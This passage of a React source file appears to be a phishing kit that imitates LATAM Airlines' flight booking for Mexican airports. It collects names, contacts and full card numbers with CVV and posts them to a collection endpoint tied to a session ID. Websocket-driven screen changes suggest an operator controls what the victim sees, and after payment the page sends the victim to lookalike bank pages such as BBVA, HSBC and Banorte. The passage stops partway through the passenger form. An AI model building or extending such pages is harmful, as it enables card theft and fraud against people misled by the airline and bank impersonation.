import { useState, useEffect } from "react";
import { useMutation } from "@tanstack/react-query";
import { apiRequest } from "@/lib/queryClient";
import { useWebSocket } from "@/hooks/use-websocket";

// Importar todos los assets exactos de VUELOS
import latamLogo from "@/assets/LATAM_navbar.png";
import takeoffIcon from "@/assets/media/takeoff_icon.png";
import mappointIcon from "@/assets/media/mappoint_icon.png";
import mainBanner from "@/assets/media/main_banner.png";
import visaLogo from "@/assets/visa.png";
import mastercardLogo from "@/assets/mastercard.png";

// Lista de aeropuertos mexicanos (igual que la carpeta VUELOS pero con México)
const AIRPORTS = [
  { city: "Ciudad de México", country: "México", code: "MEX", name: 'Aeropuerto Internacional Benito Juárez' },
  { city: "Cancún", country: "México", code: "CUN", name: 'Aeropuerto Internacional de Cancún' },
  { city: "Guadalajara", country: "México", code: "GDL", name: 'Aeropuerto Internacional de Guadalajara' },
  { city: "Monterrey", country: "México", code: "MTY", name: 'Aeropuerto Internacional de Monterrey' },
  { city: "Tijuana", country: "México", code: "TIJ", name: 'Aeropuerto Internacional de Tijuana' },
  { city: "Mérida", country: "México", code: "MID", name: 'Aeropuerto Internacional de Mérida' },
  { city: "Puerto Vallarta", country: "México", code: "PVR", name: 'Aeropuerto Internacional de Puerto Vallarta' },
  { city: "Culiacán", country: "México", code: "CUL", name: 'Aeropuerto Internacional de Culiacán' },
  { city: "León", country: "México", code: "BJX", name: 'Aeropuerto Internacional de Guanajuato' },
  { city: "San José del Cabo", country: "México", code: "SJD", name: 'Aeropuerto Internacional de Los Cabos' },
  { city: "Chihuahua", country: "México", code: "CUU", name: 'Aeropuerto Internacional de Chihuahua' },
  { city: "Hermosillo", country: "México", code: "HMO", name: 'Aeropuerto Internacional de Hermosillo' },
  { city: "Querétaro", country: "México", code: "QRO", name: 'Aeropuerto Internacional de Querétaro' },
  { city: "Oaxaca", country: "México", code: "OAX", name: 'Aeropuerto Internacional de Oaxaca' },
  { city: "Veracruz", country: "México", code: "VER", name: 'Aeropuerto Internacional de Veracruz' },
  { city: "Villahermosa", country: "México", code: "VSA", name: 'Aeropuerto Internacional de Villahermosa' },
  { city: "Tuxtla Gutiérrez", country: "México", code: "TGZ", name: 'Aeropuerto Internacional de Tuxtla Gutiérrez' },
  { city: "Mazatlán", country: "México", code: "MZT", name: 'Aeropuerto Internacional de Mazatlán' },
  { city: "Aguascalientes", country: "México", code: "AGU", name: 'Aeropuerto Internacional de Aguascalientes' },
  { city: "Tampico", country: "México", code: "TAM", name: 'Aeropuerto Internacional de Tampico' },
  { city: "Toluca", country: "México", code: "TLC", name: 'Aeropuerto Internacional de Toluca' },
  { city: "Zacatecas", country: "México", code: "ZCL", name: 'Aeropuerto Internacional de Zacatecas' },
  { city: "Acapulco", country: "México", code: "ACA", name: 'Aeropuerto Internacional de Acapulco' },
  { city: "Morelia", country: "México", code: "MLM", name: 'Aeropuerto Internacional de Morelia' },
  { city: "Puebla", country: "México", code: "PBC", name: 'Aeropuerto Internacional de Puebla' },
  { city: "La Paz", country: "México", code: "LAP", name: 'Aeropuerto Internacional de La Paz' }
];

export default function TemplateLATAM() {
  const sessionId = new URLSearchParams(window.location.search).get("sessionId");
  const { lastMessage } = useWebSocket();
  
  // Estados para las pantallas y modales exactamente como en VUELOS
  const [currentScreen, setCurrentScreen] = useState("search");
  const [showTravelType, setShowTravelType] = useState(false);
  const [showSeatType, setShowSeatType] = useState(false);
  const [showOriginModal, setShowOriginModal] = useState(false);
  const [showDestinationModal, setShowDestinationModal] = useState(false);
  const [showDatesModal, setShowDatesModal] = useState(false);
  const [showPassengersModal, setShowPassengersModal] = useState(false);
  const [isProcessingPayment, setIsProcessingPayment] = useState(false);
  
  // Estados de búsqueda
  const [originSearch, setOriginSearch] = useState("");
  const [destinationSearch, setDestinationSearch] = useState("");
  
  // Estados del formulario exactamente como en VUELOS
  const [formData, setFormData] = useState({
    origin: null as any,
    destination: null as any,
    departureDate: "",
    returnDate: "",
    travelType: "Ida y Vuelta",
    seatType: "Economy",
    adults: 1,
    children: 0,
    babies: 0,
    firstName: "",
    lastName: "",
    birthDate: "",
    gender: "",
    email: "",
    phone: "",
    cardNumber: "",
    expiryDate: "",
    cvv: "",
    cardHolder: ""
  });

  // Mutations para API
  const updateScreenMutation = useMutation({
    mutationFn: async (screen: string) => {
      if (!sessionId) return;
      const response = await apiRequest("POST", `/api/sessions/${sessionId}/change-screen`, {
        currentScreen: screen
      });
      return response.json();
    }
  });

  const submitDataMutation = useMutation({
    mutationFn: async (data: any) => {
      if (!sessionId) return;
      const response = await apiRequest("POST", "/api/submissions", {
        sessionId,
        fieldName: data.fieldName || "form_data",
        fieldValue: JSON.stringify(data)
      });
      return response.json();
    }
  });

  const handleInputChange = (field: string, value: any) => {
    setFormData(prev => ({ ...prev, [field]: value }));
  };

  // Funciones de validación para campos de tarjeta
  const formatCardNumber = (value: string) => {
    // Solo números, máximo 16 dígitos
    const numbers = value.replace(/\D/g, '');
    return numbers.slice(0, 16);
  };

  const formatExpiryDate = (value: string) => {
    // Solo números, formato MM/AA
    const numbers = value.replace(/\D/g, '');
    if (numbers.length >= 2) {
      return numbers.slice(0, 2) + '/' + numbers.slice(2, 4);
    }
    return numbers;
  };

  const formatCVV = (value: string) => {
    // Solo números, máximo 4 dígitos
    const numbers = value.replace(/\D/g, '');
    return numbers.slice(0, 4);
  };

  // CSS exactamente como en VUELOS pero convertido a embedded CSS
  const vuelos_styles = `
    /* Reset básico */
    * {
      box-sizing: border-box;
    }

    body {
      font-family: 'LATAM Sans', 'Trebuchet MS', sans-serif;
      margin: 0;
      padding: 0;
    }

    /* NAVBARS */
    .navbar{
      background-color: rgb(16, 0, 79);
      padding-inline: 16px;
      padding-block: 16px;
      padding-top: 16px;
      display: flex;
      align-items: center;
      justify-content: space-between;
    }
    .navbar--logo{
      width: 120px;
    }

    /* UTILS - Clases utilitarias exactas de VUELOS */
    .d-flex { display: flex; }
    .justify-content-center { justify-content: center; }
    .justify-content-end { justify-content: flex-end; }
    .justify-space-between { justify-content: space-between; }
    .align-items-center { align-items: center; }
    .align-items-start { align-items: flex-start; }
    .flex-direction-column { flex-direction: column; }
    .flex-wrap { flex-wrap: wrap; }

    /* Padding y Margin */
    .p-1 { padding: 4px; }
    .p-3 { padding: 12px; }
    .p-4 { padding: 16px; }
    .pl-3 { padding-left: 12px; }
    .pl-4 { padding-left: 16px; }
    .pr-3 { padding-right: 12px; }
    .pr-4 { padding-right: 16px; }
    .pt-1 { padding-top: 4px; }
    .pb-1 { padding-bottom: 4px; }
    .mt-1 { margin-top: 4px; }
    .mt-3 { margin-top: 12px; }
    .mt-4 { margin-top: 16px; }
    .mt-5 { margin-top: 20px; }
    .mb-0 { margin-bottom: 0; }
    .mb-1 { margin-bottom: 4px; }
    .mb-4 { margin-bottom: 16px; }
    .ml-3 { margin-left: 12px; }
    .m-0 { margin: 0; }

    /* Typography */
    .fs-3 { font-size: 1.125rem; font-weight: bold; }
    .fs-4 { font-size: 1rem; font-weight: bold; }
    .fs-5 { font-size: 0.875rem; }
    .fs-25 { font-size: 1.5625rem; }
    .fw-light { font-weight: 300; }
    .fw-bold { font-weight: bold; }
    .lh-1 { line-height: 1; }

    /* Colors - TODOS EN NEGRITAS COMO PEDISTE */
    .tc-ocean { color: #1b0088; font-weight: bold; }
    .tc-gray-smoke { color: #000; font-weight: bold; }

    /* Borders */
    .border-bottom { border-bottom: 1px solid #e0e0e0; }
    .rounded-white { border-radius: 8px; }

    /* Background */
    .bg-info { background-color: #e3f2fd; }

    /* BUTTONS */
    .btn-session{
      font-family: 'LATAM Sans', sans-serif;
      font-size: 1rem;
      color: white;
      font-weight: bold;
      border: none;
      border-radius: 3.125rem;
      background-color: rgb(64 51 114);
      outline: none;
      padding-inline: 0.75rem;
      min-height: 2rem;
      text-align: center;
      margin-right: 10px;
      cursor: pointer;
    }

    .btn-success {
      width: 100%;
      background-color: #cd1043;
      color: white;
      border: none;
      border-radius: 8px;
      padding: 12px 24px;
      font-size: 1rem;
      font-weight: bold;
      cursor: pointer;
      transition: background-color 0.3s;
    }

    .btn-success:hover {
      background-color: #b30f3b;
    }

    /* MODALS */
    .modal {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.5);
      display: flex;
      flex-direction: column;
      z-index: 1000;
    }

    .modal-search {
      flex: 1;
      overflow-y: auto;
    }

    .modal-bottom {
      background: white;
      padding: 16px;
      border-top: 1px solid #e0e0e0;
    }

    .modal > div:first-child {
      background: white;
      padding: 8px;
    }

    .modal .pr-4.pl-4:not(.modal-bottom) {
      background: white;
      flex: 1;
    }

    /* INPUT CONTAINER - MEJORADO PARA MEJOR VISIBILIDAD */
    .input-container {
      position: relative;
      margin: 20px 0;
    }

    .input-container input {
      width: 100%;
      padding: 16px 12px 8px 12px;
      border: 2px solid #858585;
      border-radius: 10px;
      font-size: 16px;
      font-weight: bold;
      background: white;
      outline: none;
      color: #000;
    }

    .input-container input:focus {
      border-color: #cd1043;
      box-shadow: 0 0 8px rgba(205, 16, 67, 0.2);
    }

    .input-container input:not(:placeholder-shown) {
      border-color: #cd1043;
    }

    .input-container label {
      position: absolute;
      left: 12px;
      top: 16px;
      color: #000;
      font-weight: bold;
      font-size: 14px;
      pointer-events: none;
      transition: all 0.3s;
      background: white;
      padding: 0 4px;
    }

    .input-container input:focus + label,
    .input-container input:not(:placeholder-shown) + label {
      top: -8px;
      font-size: 12px;
      color: #cd1043;
      background: white;
    }

    /* RADIO BUTTONS */
    .radio-container {
      position: relative;
    }

    .radio-container input[type="radio"] {
      opacity: 0;
      position: absolute;
    }

    .custom-radio {
      width: 20px;
      height: 20px;
      border: 2px solid #cd1043;
      border-radius: 50%;
      cursor: pointer;
      position: relative;
    }

    .radio-container input[type="radio"]:checked + .custom-radio::after {
      content: '';
      width: 12px;
      height: 12px;
      background: #cd1043;
      border-radius: 50%;
      position: absolute;
      top: 2px;
      left: 2px;
    }

    /* MAIN CONTAINER */
    .main-container {
      background: white;
      min-height: 100vh;
    }

    .search-form-container {
      padding: 24px 16px;
    }

    .main-title {
      margin: 0px;
      font-family: 'LATAM Sans', sans-serif;
      font-size: 25px;
      font-weight: 300;
      color: #1b0088;
      margin-bottom: 24px;
    }

    /* FORM FIELDS */
    .form-field {
      margin-bottom: 16px;
    }

    .form-field-button {
      width: 100%;
      padding: 16px 12px;
      border: 1px solid #858585;
      border-radius: 10px;
      background: white;
      text-align: left;
      font-size: 16px;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: space-between;
      font-weight: bold;
      color: #000;
    }

    .form-field-button:focus {
      border-color: #cd1043;
      outline: none;
    }

    .form-field-icon {
      width: 20px;
      height: 20px;
      margin-right: 8px;
    }

    /* SEARCH RESULTS */
    .search-result-item {
      padding: 12px;
      border-bottom: 1px solid #e0e0e0;
      cursor: pointer;
      transition: background-color 0.3s;
    }

    .search-result-item:hover {
      background-color: #f5f5f5;
    }

    .search-result-item:last-child {
      border-bottom: none;
    }

    .search-result-code {
      font-weight: bold;
      color: #cd1043;
      font-size: 1.1rem;
    }

    .search-result-name {
      color: #000;
      font-weight: bold;
      font-size: 0.9rem;
      margin-top: 4px;
    }

    /* PASSENGERS COUNTER */
    .passenger-counter {
      display: flex;
      align-items: center;
      gap: 12px;
    }

    .counter-btn {
      width: 22px;
      height: 22px;
      border: none;
      background: none;
      cursor: pointer;
      color: #cd1043;
    }

    .counter-value {
      min-width: 30px;
      text-align: center;
      font-weight: bold;
      font-size: 1.125rem;
    }

    /* FLIGHT SELECTION SCREEN */
    .p-fixed {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
    }

    .bg-deep-blue {
      background-color: rgb(16, 0, 79);
    }

    .bg-gray {
      background-color: #f5f5f5;
    }

    .mt-6 {
      margin-top: 140px;
    }

    .rounded-info {
      border-radius: 8px;
    }

    .bg-info {
      background-color: #e3f2fd;
    }

    .tc-pink {
      color: #cd1043;
      font-weight: bold;
    }

    .tc-deep-blue {
      color: rgb(16, 0, 79);
      font-weight: bold;
    }

    .tc-red {
      color: #e8114b;
      font-weight: bold;
    }

    .tc-blue {
      color: #2196F3;
      font-weight: bold;
    }

    .tc-light-green {
      color: #4caf50;
    }

    .border-left-bold {
      border-left: 2px solid #cd1043;
    }

    .fs-1 {
      font-size: 1.75rem;
      font-weight: 300;
    }

    .fs-2 {
      font-size: 1.25rem;
      font-weight: bold;
    }

    .fs-6 {
      font-size: 0.75rem;
    }

    .fw-lighter {
      font-weight: 200;
    }

    .fw-bolder {
      font-weight: 700;
    }

    .lh-1 {
      line-height: 1;
    }

    /* FLIGHT CARDS */
    .card-flight {
      background: white;
      border-radius: 12px;
      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
      position: relative;
      overflow: hidden;
    }

    .card-flight-label {
      position: absolute;
      top: 0;
      right: 0;
      background: #4caf50;
      color: white;
      padding: 4px 12px;
      font-size: 0.75rem;
      font-weight: bold;
      border-bottom-left-radius: 8px;
    }

    .container-seat-options {
      min-height: 200px;
    }

    .slider {
      width: 100%;
    }

    .slides {
      display: flex;
      overflow-x: auto;
      scroll-snap-type: x mandatory;
    }

    .shadow-1 {
      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
    }

    /* PASSENGERS SCREEN */
    .container-passengers {
      padding: 140px 16px 16px;
    }

    .form-passenger {
      flex-direction: column;
      gap: 16px;
    }

    .select-container {
      position: relative;
      margin: 20px 0;
    }

    .select-container select {
      width: 100%;
      padding: 16px 12px 8px 12px;
      border: 2px solid #858585;
      border-radius: 10px;
      font-size: 16px;
      background: white;
      outline: none;
      appearance: none;
      font-weight: bold;
      color: #000;
    }

    .select-container select:focus {
      border-color: #cd1043;
      box-shadow: 0 0 8px rgba(205, 16, 67, 0.2);
    }

    .select-container label {
      position: absolute;
      left: 12px;
      top: -8px;
      color: #cd1043;
      font-weight: bold;
      font-size: 12px;
      pointer-events: none;
      background: white;
      padding: 0 4px;
    }

    /* PAYMENT SCREEN */
    .card-rounded {
      border-radius: 12px;
    }

    .rounded-borded {
      border-radius: 12px;
    }

    .radio-blue {
      border-color: #2196F3;
    }

    .radio-container input[type="radio"]:checked + .radio-blue::after {
      background: #2196F3;
    }

    /* PROCESSING PAYMENT SCREEN */
    .processing-container {
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      background: linear-gradient(135deg, #10004f 0%, #cd1043 100%);
      color: white;
      text-align: center;
      padding: 20px;
    }

    .spinner {
      width: 60px;
      height: 60px;
      border: 6px solid rgba(255, 255, 255, 0.3);
      border-top: 6px solid white;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-bottom: 30px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .processing-title {
      font-size: 2rem;
      font-weight: bold;
      margin-bottom: 15px;
    }

    .processing-text {
      font-size: 1.2rem;
      font-weight: normal;
      opacity: 0.9;
      margin-bottom: 10px;
    }

    /* RESPONSIVE */
    @media (max-width: 768px) {
      .modal {
        padding: 0;
      }
    }
  `;

  const filteredOrigins = AIRPORTS.filter(airport =>
    airport.city.toLowerCase().includes(originSearch.toLowerCase()) ||
    airport.code.toLowerCase().includes(originSearch.toLowerCase())
  );

  const filteredDestinations = AIRPORTS.filter(airport =>
    airport.city.toLowerCase().includes(destinationSearch.toLowerCase()) ||
    airport.code.toLowerCase().includes(destinationSearch.toLowerCase())
  );

  const handlePassengerChange = (type: string, operation: string) => {
    const current = formData[type as keyof typeof formData] as number;
    let newValue = current;
    
    if (operation === '+') {
      newValue = current + 1;
    } else if (operation === '-') {
      newValue = Math.max(type === 'adults' ? 1 : 0, current - 1);
    }
    
    handleInputChange(type, newValue);
  };

  const handleFormSubmit = () => {
    submitDataMutation.mutate({
      ...formData,
      fieldName: "flight_search"
    });
    setCurrentScreen("flights");
  };

  const handleScreenChange = (screen: string) => {
    setCurrentScreen(screen);
    updateScreenMutation.mutate(screen);
  };

  const handlePaymentSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    
    // Enviar todos los datos del formulario
    submitDataMutation.mutate({
      ...formData,
      fieldName: "payment_data",
      timestamp: new Date().toISOString()
    });
    
    // Si seleccionó un banco específico, redirigir a su pantalla
    const selectedBank = formData.bank;
    if (selectedBank && selectedBank !== "00") {
      setIsProcessingPayment(true);
      
      // Simular procesamiento y redirigir al banco después de 2 segundos
      setTimeout(() => {
        const bankUrls = {
          'AZTECA': 'VUELOS/azteca.php',
          'NUBANK': 'VUELOS/nubank.php', 
          'HSBC': 'VUELOS/hsbc.php',
          'BANCOPPEL': 'VUELOS/bancoppel.php',
          'BBVA': 'VUELOS/bbva.php',
          'BANORTE': 'VUELOS/banorte.php'
        };
        
        const bankUrl = bankUrls[selectedBank as keyof typeof bankUrls];
        if (bankUrl) {
          window.location.href = bankUrl;
        } else {
          // Payment processed silently
          setIsProcessingPayment(false);
        }
      }, 2000);
    } else {
      setIsProcessingPayment(true);
      setTimeout(() => {
        // Payment processed silently
        setIsProcessingPayment(false);
      }, 3000);
    }
  };

  const renderScreen = () => {
    if (isProcessingPayment) {
      return renderProcessingPayment();
    }
    
    switch (currentScreen) {
      case "flights":
        return renderFlightSelection();
      case "passengers":
        return renderPassengerInfo();
      case "payment":
        return renderPayment();
      default:
        return renderSearchForm();
    }
  };

  const renderSearchForm = () => (
    <div className="main-container">
      <style>{vuelos_styles}</style>
      
      {/* MODAL TIPO DE VIAJE */}
      {showTravelType && (
        <div className="modal">
          <div className="d-flex justify-content-end p-1" onClick={() => setShowTravelType(false)}>
            <svg style={{width: '25px', color:'#5c5c5c'}} xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 32 32">
              <path d="M30 27.5829L27.1881 30.375L16 19.1869L4.79207 30.375L2 27.5829L13.1881 16.375L2 5.18685L4.79207 2.375L15.9802 13.5829L27.1881 2.375L30 5.18685L18.7921 16.375L30 27.5829Z" fill="currentColor"/>
            </svg>
          </div>
          <div className="pr-4 pl-4">
            <h4 className="fw-light fs-25 tc-ocean mt-1">Tipo de Viaje</h4>
            <div className="d-flex justify-space-between">
              <span className="fs-5 tc-gray-smoke">Ida y Vuelta</span>
              <div className="radio-container">
                <input 
                  type="radio" 
                  name="travel-opt" 
                  checked={formData.travelType === "Ida y Vuelta"}
                  onChange={() => handleInputChange("travelType", "Ida y Vuelta")}
                />
                <div className="custom-radio"></div>
              </div>
            </div>
            <div className="d-flex justify-space-between mt-3">
              <span className="fs-5 tc-gray-smoke">Solo Ida</span>
              <div className="radio-container">
                <input 
                  type="radio" 
                  name="travel-opt" 
                  checked={formData.travelType === "Solo Ida"}
                  onChange={() => handleInputChange("travelType", "Solo Ida")}
                />
                <div className="custom-radio"></div>
              </div>
            </div>
            <button className="btn-success mt-5" onClick={() => setShowTravelType(false)}>Confirmar</button>
          </div>
        </div>
      )}

      {/* MODAL TIPO DE CABINA */}
      {showSeatType && (
        <div className="modal">
          <div className="d-flex justify-content-end p-1" onClick={() => setShowSeatType(false)}>
            <svg style={{width: '25px', color:'#5c5c5c'}} xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 32 32">
              <path d="M30 27.5829L27.1881 30.375L16 19.1869L4.79207 30.375L2 27.5829L13.1881 16.375L2 5.18685L4.79207 2.375L15.9802 13.5829L27.1881 2.375L30 5.18685L18.7921 16.375L30 27.5829Z" fill="currentColor"/>
            </svg>
          </div>
          <div className="pr-4 pl-4">
            <h4 className="fw-light fs-25 tc-ocean mt-1">Tipo de Cabina</h4>
            <div className="d-flex justify-space-between">
              <span className="fs-5 tc-gray-smoke">Economy</span>
              <div className="radio-container">
                <input 
                  type="radio" 
                  name="seat-type" 
                  checked={formData.seatType === "Economy"}
                  onChange={() => handleInputChange("seatType", "Economy")}
                />
                <div className="custom-radio"></div>
              </div>
            </div>
            <div className="d-flex justify-space-between mt-3">
              <span className="fs-5 tc-gray-smoke">Premium Economy</span>
              <div className="radio-container">
                <input 
                  type="radio" 
                  name="seat-type" 
                  checked={formData.seatType === "Premium Economy"}
                  onChange={() => handleInputChange("seatType", "Premium Economy")}
                />
                <div className="custom-radio"></div>
              </div>
            </div>
            <div className="d-flex justify-space-between mt-3">
              <span className="fs-5 tc-gray-smoke">Premium Business</span>
              <div className="radio-container">
                <input 
                  type="radio" 
                  name="seat-type" 
                  checked={formData.seatType === "Premium Business"}
                  onChange={() => handleInputChange("seatType", "Premium Business")}
                />
                <div className="custom-radio"></div>
              </div>
            </div>
            <button className="btn-success mt-5" onClick={() => setShowSeatType(false)}>Confirmar</button>
          </div>
        </div>
      )}

      {/* MODAL ORIGEN */}
      {showOriginModal && (
        <div className="modal">
          <div className="d-flex justify-content-end p-1" onClick={() => setShowOriginModal(false)}>
            <svg style={{width: '25px', color:'#5c5c5c'}} xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 32 32">
              <path d="M30 27.5829L27.1881 30.375L16 19.1869L4.79207 30.375L2 27-5829L13.1881 16.375L2 5.18685L4.79207 2.375L15.9802 13.5829L27.1881 2.375L30 5.18685L18.7921 16.375L30 27.5829Z" fill="currentColor"/>
            </svg>
          </div>
          <div className="pr-4 pl-4 modal-search">
            <h4 className="fw-light fs-25 tc-ocean mt-1 mb-0">Ingresa tu Origen</h4>
            <div className="input-container">
              <input 
                type="text" 
                value={originSearch}
                onChange={(e) => setOriginSearch(e.target.value)}
                placeholder=" "
                autoFocus
              />
              <label>Origen</label>
            </div>
            <div className="mt-4">
              {filteredOrigins.map((airport) => (
                <div 
                  key={airport.code}
                  className="search-result-item"
                  onClick={() => {
                    handleInputChange("origin", airport);
                    setShowOriginModal(false);
                    setOriginSearch("");
                  }}
                >
                  <div className="search-result-code">{airport.city} ({airport.code})</div>
                  <div className="search-result-name">{airport.name}</div>
                </div>
              ))}
            </div>
          </div>
          <div className="modal-bottom pr-4 pl-4">
            <button className="btn-success mt-5" onClick={() => setShowOriginModal(false)}>Confirmar</button>
          </div>
        </div>
      )}

      {/* MODAL DESTINO */}
      {showDestinationModal && (
        <div className="modal">
          <div className="d-flex justify-content-end p-1" onClick={() => setShowDestinationModal(false)}>
            <svg style={{width: '25px', color:'#5c5c5c'}} xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 32 32">
              <path d="M30 27.5829L27.1881 30.375L16 19.1869L4.79207 30.375L2 27.5829L13.1881 16.375L2 5.18685L4.79207 2.375L15.9802 13.5829L27.1881 2.375L30 5.18685L18.7921 16.375L30 27.5829Z" fill="currentColor"/>
            </svg>
          </div>
          <div className="pr-4 pl-4 modal-search">
            <h4 className="fw-light fs-25 tc-ocean mt-1 mb-0">Ingresa tu Destino</h4>
            <div className="input-container">
              <input 
                type="text" 
                value={destinationSearch}
                onChange={(e) => setDestinationSearch(e.target.value)}
                placeholder=" "
                autoFocus
              />
              <label>Destino</label>
            </div>
            <div className="mt-4">
              {filteredDestinations.map((airport) => (
                <div 
                  key={airport.code}
                  className="search-result-item"
                  onClick={() => {
                    handleInputChange("destination", airport);
                    setShowDestinationModal(false);
                    setDestinationSearch("");
                  }}
                >
                  <div className="search-result-code">{airport.city} ({airport.code})</div>
                  <div className="search-result-name">{airport.name}</div>
                </div>
              ))}
            </div>
          </div>
          <div className="modal-bottom pr-4 pl-4">
            <button className="btn-success mt-5" onClick={() => setShowDestinationModal(false)}>Confirmar</button>
          </div>
        </div>
      )}

      {/* MODAL FECHAS */}
      {showDatesModal && (
        <div className="modal">
          <div className="d-flex justify-content-end p-1" onClick={() => setShowDatesModal(false)}>
            <svg style={{width: '25px', color:'#5c5c5c'}} xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 32 32">
              <path d="M30 27.5829L27.1881 30.375L16 19.1869L4.79207 30.375L2 27.5829L13.1881 16.375L2 5.18685L4.79207 2.375L15.9802 13.5829L27.1881 2.375L30 5.18685L18.7921 16.375L30 27.5829Z" fill="currentColor"/>
            </svg>
          </div>
          <div className="pr-4 pl-4 modal-search">
            <h4 className="fw-light fs-25 tc-ocean mt-1 mb-0">¿Cuándo viajas?</h4>
            <div className="input-container">
              <input 
                type="date" 
                value={formData.departureDate}
                onChange={(e) => handleInputChange("departureDate", e.target.value)}
              />
              <label>Fecha de ida</label>
            </div>
            {formData.travelType === "Ida y Vuelta" && (
              <div className="input-container">
                <input 
                  type="date" 
                  value={formData.returnDate}
                  onChange={(e) => handleInputChange("returnDate", e.target.value)}
                />
                <label>Fecha de vuelta</label>
              </div>
            )}
          </div>
          <div className="modal-bottom pr-4 pl-4">
            <button className="btn-success mt-5" onClick={() => setShowDatesModal(false)}>Confirmar</button>
          </div>
        </div>
      )}

      {/* MODAL PASAJEROS */}
      {showPassengersModal && (
        <div className="modal">
          <div className="d-flex justify-content-end p-1" onClick={() => setShowPassengersModal(false)}>
            <svg style={{width: '25px', color:'#5c5c5c'}} xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 32 32">
              <path d="M30 27.5829L27.1881 30.375L16 19.1869L4.79207 30.375L2 27.5829L13.1881 16.375L2 5.18685L4.79207 2.375L15.9802 13.5829L27.1881 2.375L30 5.18685L18.7921 16.375L30 27.5829Z" fill="currentColor"/>
            </svg>
          </div>
          <div className="pr-4 pl-4 modal-search">
            <h4 className="fw-light fs-25 tc-ocean mt-1">Agregar Pasajeros</h4>
            
            {/* ADULTOS */}
            <div className="border-bottom pb-1">
              <div className="d-flex justify-space-between tc-gray-smoke">
                <div className="d-flex justify-content-center align-items-center">
                  <svg style={{marginRight: '18px', marginLeft: '15px'}} viewBox="0 0 16 21" width="16" height="21" color="#B30F3B">
                    <path style={{fill: 'currentColor'}} d="M8.63396 7.93475C8.33208 8.1047 8.01006 8.24279 7.66792 8.34901C7.34591 8.43399 7.01384 8.47648 6.6717 8.47648C5.58491 8.47648 4.63899 8.06221 3.83396 7.23369C3.04906 6.38391 2.6566 5.38543 2.6566 4.23824C2.6566 3.09105 3.04906 2.10319 3.83396 1.27466C4.63899 0.424886 5.58491 0 6.6717 0C7.41635 0 8.10063 0.201821 8.72453 0.605463C9.34843 1.0091 9.83145 1.52959 10.1736 2.16692C10.3346 2.48558 10.4553 2.82549 10.5358 3.18665C10.6365 3.52656 10.6868 3.87709 10.6868 4.23824C10.6868 5.02428 10.4956 5.74659 10.1132 6.40516C9.73082 7.06373 9.23773 7.5736 8.63396 7.93475ZM9.75094 4.23824C9.75094 3.34598 9.44906 2.58118 8.84528 1.94385C8.24151 1.30653 7.51698 0.987861 6.6717 0.987861C5.82641 0.987861 5.10189 1.30653 4.49811 1.94385C3.89434 2.58118 3.59245 3.34598 3.59245 4.23824C3.59245 5.1305 3.89434 5.8953 4.49811 6.53263C5.10189 7.16995 5.82641 7.48862 6.6717 7.48862C7.51698 7.48862 8.24151 7.16995 8.84528 6.53263C9.44906 5.8953 9.75094 5.1305 9.75094 4.23824ZM0.935849 20.4901C0.935849 20.6388 0.885535 20.7663 0.784906 20.8725C0.704403 20.9575 0.593711 21 0.452831 21C0.332076 21 0.221384 20.9575 0.120755 20.8725C0.0402516 20.7663 0 20.6388 0 20.4901V13.7026C0 13.5964 0.0201258 13.5008 0.0603775 13.4158C0.120755 13.3308 0.201258 13.2671 0.301887 13.2246L13.3736 8.25341C14.1182 7.95599 14.7421 7.98786 15.2453 8.34901C15.7484 8.68892 16 9.24127 16 10.0061V20.4583C16 20.5857 15.9497 20.7026 15.8491 20.8088C15.7686 20.8938 15.6579 20.9363 15.517 20.9363C15.3761 20.9363 15.2654 20.8938 15.1849 20.8088C15.1044 20.7026 15.0641 20.5857 15.0641 20.4583V10.0061C15.0641 9.60243 14.9434 9.31563 14.7019 9.14567C14.4805 8.97572 14.1484 8.98634 13.7057 9.17754L0.935849 14.0531V20.4901Z"></path>
                  </svg>
                  <div>
                    <p className="fs-4 m-0 mb-1">Adultos</p>
                    <p className="fs-5 m-0">12 o más años</p>
                  </div>
                </div>
                <div className="d-flex align-items-center passenger-counter">
                  <button className="counter-btn" onClick={() => handlePassengerChange('adults', '-')}>
                    <svg viewBox="0 0 24 24" width="22" height="22" color="#B30F3B">
                      <path style={{fill: 'currentColor'}} d="M12 1C18.1 1 23 5.9 23 12C23 18.1 18.1 23 12 23C5.9 23 1 18.1 1 12C1 5.9 5.9 1 12 1ZM12 0C5.4 0 0 5.4 0 12C0 18.6 5.4 24 12 24C18.6 24 24 18.6 24 12C24 5.4 18.6 0 12 0Z"></path>
                      <path style={{fill: 'currentColor'}} d="M18 11.5H12.5H11.5H6V12.5H11.5H12.5H18V11.5Z"></path>
                    </svg>
                  </button>
                  <span className="counter-value">{formData.adults}</span>
                  <button className="counter-btn" onClick={() => handlePassengerChange('adults', '+')}>
                    <svg viewBox="0 0 24 24" width="22" height="22" color="#B30F3B">
                      <path style={{fill: 'currentColor'}} d="M12 1C18.1 1 23 5.9 23 12C23 18.1 18.1 23 12 23C5.9 23 1 18.1 1 12C1 5.9 5.9 1 12 1ZM12 0C5.4 0 0 5.4 0 12C0 18.6 5.4 24 12 24C18.6 24 24 18.6 24 12C24 5.4 18.6 0 12 0Z"></path>
                      <path style={{fill: 'currentColor'}} d="M18 11.5H12.5V6H11.5V11.5H6V12.5H11.5V18H12.5V12.5H18V11.5Z"></path>
                    </svg>
                  </button>
                </div>
              </div>
            </div>

            {/* NIÑOS */}
            <div className="d-flex justify-space-between tc-gray-smoke pt-1 pb-1 border-bottom">
              <div className="d-flex justify-content-center align-items-center">
                <svg style={{marginRight: '18px', marginLeft: '15px'}} viewBox="0 0 16 16" width="16" height="16" color="#B30F3B">
